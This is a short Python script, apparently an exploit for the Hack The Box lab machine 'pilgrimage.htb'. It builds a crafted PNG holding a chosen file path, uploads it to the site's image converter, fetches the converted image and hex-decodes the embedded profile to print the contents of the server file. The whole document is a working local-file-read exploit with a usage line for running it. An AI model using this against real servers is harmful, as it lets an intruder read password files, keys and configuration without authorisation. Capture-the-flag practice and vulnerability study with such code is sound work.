import subprocess, sys, requests, re
from urllib.parse import parse_qs, urlparse

url = 'http://pilgrimage.htb/'

def main():
    if (sys.argv[1] == ''):
        print("Usage: python3 lfi.py /file/path")
        return
    
    subprocess.run(["python3", "generate.py", "-f", sys.argv[1], "-o", "payload.png"])

    files = {'toConvert': open('payload.png','rb')}
    r = requests.post(url, files=files)
    params = parse_qs(urlparse(r.url).query)
    uploadedFile = params['message'][0]

    subprocess.run(["wget", uploadedFile, "-O", "result.png"])
    identifyResult = subprocess.run(["identify", "-verbose", "result.png"],
                                    capture_output = True,
                                    text = True)

    matches = re.search("Raw profile type:\s\n\n\s+\d+\n([0-9A-Fa-f\n]+)", identifyResult.stdout)
    if (matches):
        extractedHex = matches.group(1).strip()
        print(bytes.fromhex(extractedHex).decode(encoding="utf-8", errors="ignore"))
    else:
        print('probably no file')

if __name__ == '__main__':
    main()
